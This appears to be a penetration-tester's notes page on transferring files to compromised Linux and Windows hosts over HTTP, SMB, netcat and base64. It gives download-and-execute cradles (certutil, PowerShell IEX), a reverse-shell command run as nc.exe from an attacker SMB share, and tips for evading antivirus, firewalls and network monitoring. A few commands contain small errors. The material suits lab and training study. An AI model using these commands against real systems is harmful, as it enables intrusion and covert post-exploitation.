# File Transfers

File transfers are essential for an attacker. When we compromise a system, there are binaries and scripts that would make the further enumeration for privilege escalation a lot more useful. We can only do file transfers as long as we can execute commands on the system (via web shell or using a shell)

There are a few methods of transferring files, and the usage of each would depend on what is allowed on the system (the stuff the firewall doesn't block).

When downloading files, make sure that we output the file in a **directory that we can write to**.\
Possible directories include:

{% code title="For Linux" %}
```bash
/tmp
/dev/shm
/home/<user>
/var/www/html/<whatever>
# just check which directories we can write to using ls -la
```
{% endcode %}

```bash
C:\user\<compromised_user>\
C:\windows\temp\
C:\windows\system32\spool\drivers\color
C:\windows\tasks
# directories that are writeable to by all users
```

## HTTP

One of the easiest ways to transfer files easily. This would involve setting up a HTTP server on our attacking machine, and this can be done easily with a Python3 module.

```python
python3 -m http.server <port>
python2 -m SimpleHTTPServer <port>
```

Afterwards, depending on the OS, we can download the files over.

{% code title="Linux to Linux" %}
```bash
wget http://10.10.10.10/linpeas.sh -o linpeas.sh
# -o is optional for Linux systems
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
certutil.exe -urlcache -split -f "http://10.10.10.10./winPEAS.exe" "C:\users\vulnerable\documents\winpeas.exe"

# with powershell
powershell
wget "http://10.10.10.10/binary" -OutFile "C:\users\user\documents\binary.exe"

# or
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1', 'C:\users\user\documents\9002.ps1')

# curl
curl http://10.10.10.14/file -o C:\users\user\desktop\file
```
{% endcode %}

These are just some of the commands that we can use.

However, take note for Windows machines that even though we can run these, sometimes, there are firewalls or other Anti-Viruses that block the usage of these, and we cannot transfer files that easily. Sometimes, the anti-viruses may block certain ports from receiving connections.

To circumvent port blocking, I set up the Python HTTP server with commonly unblocked ports that are intended for web traffic, **such as port 80 and port 443,** which are for HTTP and HTTPS respectively.

However, there are times when downloading files to the machine via HTTP are blocked entirely. As such, rely on other methods to make it work.

## Server Message Block

Server Message Block (SMB) can run on either Windows or Linux, and we can transfer files using it if port 139 and 445 are open. I mainly use this for downloading to Windows machines.

First, set up a smbserver on our Linux machine, which we can do with smbserver.py from the **impacket suite**.

{% code overflow="wrap" %}
```bash
smbserver.py <name of share> <directory to make a share> -smb2support
# normally, i use 'share' as the name and '.' to signify the current working directory

smbserver.py -username guest -password guest share . -smb2support
# sometimes, windows defender does not allow smb connections that do not have credentials.
```
{% endcode %}

{% embed url="https://github.com/SecureAuthCorp/impacket" %}

SMB has the cool thing whereby we can download and run the files **without making a copy on the target machine**. This would mean that it is executed more stealthily without leaving any trace.

To download/execute files:

```powershell
#download
copy \\10.10.10.10\share\winPEAS.exe winpeas.exe

#use
\\10.10.10.10.\share\nc.exe 10.10.10.10 1234 -e cmd.exe
```

However, take note that this wouldn't work if SMB is not running or is completely blocked from making external connections.

## Netcat

Netcat is a computer network utility for reading from and writing to network connections using TCP or UDP. This exists as a binary in Linux that can be used via the `nc` command, or as a .exe file for windows.

{% embed url="https://github.com/int0x33/nc.exe/" %}

NC can be used to transfer files over ports should we be unable to use SMB or HTTP. **However, for Windows machines, we would need to get the nc.exe binary onto the target machine before we use it.**

For Linux machines, we just need to make sure that nc is installed. The&#x20;

```bash
# receiving end
nc(.exe) -l -p 1234 > out.file
# sending end
nc(.exe) -w 3 10.10.10.10. 1234 < out.file
```

Super useful when we cannot use wget or other methods.&#x20;

## Base64

I rely on this method the least because of the fact that sometimes, files aren't transferred properly using this. This method does not require any form of connection, and only requires base64.

> Base64 encoding schemes are commonly used when there is a need to encode binary data that needs to be stored and transffered over media that is designed to deal with ASCII.
>
> _Taken from Mozilla_

What this means is that every file, whether it's a .jpg, .gif, .exe, .elf or whatever, can be translated to base64. Subsequently, we can decode the base64 to get the file back.

This method just requires some commands to be used.

```bash
# on attacking machine
base64 <file> > base64file.txt
# copy and paste the base64 text to victim machine
base64 -d base64file.txt > binary
```

<pre class="language-powershell"><code class="lang-powershell"><strong># for powershell 
</strong><strong>[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))
</strong></code></pre>

Base64 can come in handy when we are transferring files. However take note that sometimes this method would produce anomalous results that don't work. This method is ideal when we cannot make any connections (which is unlikely) or if we want to stay hidden from network monitors.

##
